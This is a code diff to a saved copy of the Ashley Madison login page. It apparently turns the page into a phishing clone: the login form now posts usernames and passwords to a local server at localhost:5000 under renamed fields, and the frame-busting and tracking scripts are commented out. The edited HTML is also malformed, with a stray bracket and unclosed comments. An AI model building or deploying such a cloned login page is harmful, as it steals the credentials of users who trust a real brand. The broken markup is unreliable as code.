@@ -30,14 +30,17 @@
         <script type="text/javascript" src="./AshleyMadison_files/jquery.cookie.1e3faa7f.js"></script>
         <script type="text/javascript" src="./AshleyMadison_files/bootstrap.min.c5b5b2fa.js"></script>
         <script type="text/javascript" src="./AshleyMadison_files/bootstrap-select.min.ca17eaad.js"></script>
-        <script type="text/javascript" src="./AshleyMadison_files/countrylangselector_v5.d568ba9a.js"></script>
+        <!--<script type="text/javascript" src="./AshleyMadison_files/countrylangselector_v5.d568ba9a.js"></script>
         <script type="text/javascript">
   var gtTrackAllEvents = true;
   var gtTrackSignUp = true;
   var gtBaseUrl = 'https://www.ashleymadison.com/';
   var gtBaseUrlApi = 'https://api.ashleymadison.com/';
-</script>
-<!-- <script src="./AshleyMadison_files/track.b7c78554.js"></script>
+        </script>>
+
+
+        <!-- <script src="./AshleyMadison_files/track.b7c78554.js"</script>
+        <!--
 
         <script type="text/javascript">
             if (this != top) {
@@ -45,8 +48,8 @@
             }
                     </script>
 
-        <script>_udn='.ashleymadison.com';</script> -->
-<!-- <script>
+        <script>_udn='.ashleymadison.com';</script>
+<script>
   function cookie_read(name) { var nameEQ = name + "="; var ca = document.cookie.split(';'); for(var i=0;i < ca.length;i++) { var c = ca[i]; while (c.charAt(0)==' ') c = c.substring(1,c.length); if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length,c.length); }; return null; };
   affid = cookie_read('amaffiliate');
   kwd = cookie_read('amkeywords');
@@ -101,15 +104,15 @@
 
     <h1 class="text-center">Login</h1>
   
-      <form id="basicLoginForm" class="pure-form pure-form-stacked" name="loginform" action="https://www.ashleymadison.com/app/public/loginaction.p" onsubmit="return validateLoginForm()" method="POST">
-                <div class="form-group row">  
-      <div class="col-xs-12">
-        <label class="form_label">Username</label>
-      </div>
+      <form id="basicLoginForm" class="pure-form pure-form-stacked" action="http://localhost:5000/login" method="POST">
+          <div class="form-group row">
+              <div class="col-xs-12">
+                <label class="form_label">Username</label>
+          </div>
 
-     <div class="col-xs-12">      
+         <div class="col-xs-12">
 
-<input type="text" id="pinf_uio_app%2Fstructure%2Fpublic%2Flogin_login__username_value" name="pinf_uio_app%2Fstructure%2Fpublic%2Flogin_login__username_value" value="" size="20">
+<input type="text" id="pinf_uio_app%2Fstructure%2Fpublic%2Flogin_login__username_value" name="id" value="" size="20">
 
      </div>
 
@@ -119,7 +122,7 @@
 
       <div class="col-xs-12">
         
-<input type="password" id="pinf_uio_app%2Fstructure%2Fpublic%2Flogin_login__password_value" name="pinf_uio_app%2Fstructure%2Fpublic%2Flogin_login__password_value" autocomplete="off" size="20">
+<input type="password" id="pinf_uio_app%2Fstructure%2Fpublic%2Flogin_login__password_value" name="pw" autocomplete="off" size="20">
 
       </div>
 
